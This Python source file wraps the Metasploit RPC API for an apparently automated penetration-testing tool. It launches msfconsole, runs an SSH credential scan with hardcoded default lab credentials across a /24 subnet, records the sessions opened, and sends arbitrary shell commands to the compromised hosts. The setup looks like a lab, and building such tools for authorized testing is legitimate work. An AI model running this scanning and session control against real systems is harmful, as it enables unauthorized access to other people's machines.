import os
import time  # Fix: Import time module
import json
import subprocess
from pymetasploit3.msfrpc import MsfRpcClient  # Fix: Import MsfRpcClient properly

class Metasploit:
    def __init__(self, password, Eshu, server="127.0.0.1", port=1337):
        self.name = "Metasploit API"
        self.start_msfconsole_with_script("/usr/src/metasploit-framework/docker/msfconsole.rc")
        print(f"Starting {self.name}")
        while True:
            try:
                self.client = MsfRpcClient(password, server=server, port=port)  # Fix: Ensure this import works
                break
            except:
                print("[!] Failed. Trying again...")
                time.sleep(0.5)

        print(f"[+] Successfully connected to MSF Server!")
        self.eshu = Eshu

    def start_msfconsole_with_script(self, resource_script):
        """Start msfconsole with the specified resource script."""
        if not os.path.exists(resource_script):
            print(f"[!] Resource script {resource_script} not found!")
            return
        
        print(f"[+] Starting msfconsole with resource script: {resource_script}")
        try:
            subprocess.Popen(
                ["msfconsole", "-r", resource_script],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            time.sleep(0.5)  # Allow time for msfconsole to initialize
            print(f"[+] msfconsole started successfully!")
        except Exception as e:
            print(f"[!] Error starting msfconsole: {e}")

    def query_hosts(self):
        
        run_exploit = self.client.modules.use('auxiliary', 'scanner/ssh/ssh_login')
        run_exploit["RHOSTS"] = '10.1.1.3/24'
        run_exploit["USERNAME"] = 'msfadmin'
        run_exploit["PASSWORD"] = 'msfadmin'
        run_exploit["THREADS"] = 5 
        print(f"Running exploit: {run_exploit} with 1 second scan...")
        result = run_exploit.execute()
        time.sleep(1)  # Allow time for the scan to run
        if 'job_id' in result:
            print("[+] Scan Complete!")
        else:
            print("[!] Scan failed. Retrying...")
        
        """Retrieve all active sessions from Metasploit."""
        hosts = []
        print("Retrieving active sessions in Metasploit...")
        for session_id, session in self.client.sessions.list.items():
            host_info = {
                "session_id": session_id,
                "target_host": session.get("tunnel_peer", "N/A"),
                "platform": session.get("platform", "N/A"),
                "via_exploit": session.get("via_exploit", "N/A"),
                "via_payload": session.get("via_payload", "N/A"),
            }
            hosts.append(host_info)
            # Save host info to Eshu's targets
            host_id = f"msf{session_id}"
            self.eshu.save_session(host_id, host_info)
        if hosts:
            print("[+] Active sessions retrieved:")
            for host in hosts:
                print(f"\tSession ID {host['session_id']}: Target Host: {host['target_host']}, Platform: {host['platform']}")
        else:
            print("[!] No active sessions.")
        return hosts

    def send_cmd(self, id=None, os=None, commands=[]):
        if not id:
            raise ValueError("[!] Host ID must be provided.")

        # Retrieve the session information
        session_info = self.eshu.targets.get(id)  # Retrieve host info
        if not session_info:
            raise ValueError(f"[!] Host ID {id} not found in targets.")

        session_id = session_info.get("session_id")  # Get session ID from host info
        if not session_id:
            raise ValueError(f"[!] No session ID found for Host ID {id}.")

        # Retrieve the session from Metasploit
        session = self.client.sessions.list.get(str(session_id))
        if not session:
            raise ValueError(f"[!] Session with ID {session_id} not found.")

        # Check OS compatibility if provided
        session_platform = session.get("platform", "N/A")
        if os and session_platform != os and session_platform != "N/A":
            raise ValueError(f"[!] Session {session_id} is not running on the specified OS: {os}.")

        # Execute commands
        output = []
        for cmd in commands:
            try:
                print(f"Sending command '{cmd}' to target with ID: {id}")
                cmd_output = self.client.sessions.session(str(session_id)).run_with_output(cmd, end_strs=["$", "#", "\n"])
                output.append(f"Output for {cmd}: {cmd_output}")
                print(f"[+] Successfully executed command: {cmd}")
            except Exception as e:
                output.append(f"[!] Error executing command '{cmd}': {e}")
        return output

    def list_exploit(self, module_type):
       if not self.client:
           raise ConnectionError("[!] Not connected")
       return self.client.modules.search(module_type)